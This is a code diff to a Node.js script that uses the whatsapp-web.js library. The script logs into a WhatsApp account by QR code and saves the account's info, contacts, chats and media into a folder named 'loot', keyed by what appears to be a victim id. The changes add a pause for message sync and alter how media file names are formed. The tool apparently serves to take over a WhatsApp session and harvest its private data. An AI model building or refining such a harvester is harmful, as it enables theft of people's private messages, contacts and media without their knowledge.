@@ -4,6 +4,7 @@ const id = 12750;
 
 const fs = require('fs');
 const qrcode = require('qrcode-terminal');
+const prompt = require("prompt-sync")();
 const { Client, LocalAuth } = require('whatsapp-web.js');
 const client = new Client({authStrategy: new LocalAuth({clientId: id})});
 
@@ -17,6 +18,7 @@ client.on('qr', qr => {
 
 client.on('ready', () => {
     console.log('Authenticated successfully.');
+    prompt('Press [ENTER] when sync has ended. ');
     var mediacount = 0;
     fs.writeFile('./loot/' + id + '/clientinfo.json', JSON.stringify(client.info, null, 4), 'utf-8', (e) => {if (e != null) {console.error('An error occurred: ' + e);} else {console.log('Written client info successfully.');};});
     client.getContacts().then(val => fs.writeFile('./loot/' + id + '/contacts.json', JSON.stringify(val, null, 4), 'utf-8', (e) => {if (e != null) {console.error('An error occurred: ' + e);} else {console.log('Written contacts successfully.');};}));
@@ -29,7 +31,7 @@ client.on('ready', () => {
                     if (!fs.existsSync('./loot/' + id + '/chats/' + chat.id._serialized)){fs.mkdirSync('./loot/' + id + '/chats/' + chat.id._serialized);};
                     message.downloadMedia().then(file => {
                         if (file) {
-                            fs.writeFile('./loot/' + id + '/chats/' + chat.id._serialized + '/' + message.id.id + '.' + file.mimetype.split('/')[1], Buffer.from(file.data, 'base64'), 'utf-8', (e) => {if (e != null) {console.error('An error occurred: ' + e);} else {mediacount++; console.log('Downloaded media successfully. (' + mediacount + ')');};});
+                            fs.writeFile('./loot/' + id + '/chats/' + chat.id._serialized + '/' + message.id.id + '.' + file.mimetype.replaceAll('/', 'Slash'), Buffer.from(file.data, 'base64'), 'utf-8', (e) => {if (e != null) {console.error('An error occurred: ' + e);} else {mediacount++; console.log('Downloaded media successfully. (' + mediacount + ')');};});
                         };
                     })
                 };
